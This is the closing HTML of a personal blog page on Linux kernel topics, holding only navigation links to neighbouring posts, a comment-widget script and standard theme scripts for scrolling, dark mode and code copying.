  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://mpdesouza.com/blog/kbuild-livepatch-selftests/">
    <span class="title">Â« Prev</span>
    <br>
    <span>Livepatch selftests: the journey to Kbuild and back</span>
  </a>
  <a class="next" href="https://mpdesouza.com/blog/from-zero-to-double-free/">
    <span class="title">Next Â»</span>
    <br>
    <span>From zero to double free: The process of creating a reproducer for a kernel vulnerability</span>
  </a>
</nav>

  </footer><script src="https://giscus.app/client.js"
        data-repo="marcosps/marcosps.github.io"
        data-repo-id="MDEwOlJlcG9zaXRvcnkzMzYwMzkyNzM="
        data-category="Announcements"
        data-category-id="DIC_kwDOFAeNac4CWA_8"
        data-mapping="pathname"
        data-strict="0"
        data-reactions-enabled="1"
        data-emit-metadata="0"
        data-input-position="top"
        data-theme="preferred_color_scheme"
        data-lang="en"
        data-loading="lazy"
        crossorigin="anonymous"
        async>
</script>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://mpdesouza.com">Marcos&#39; Blog</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
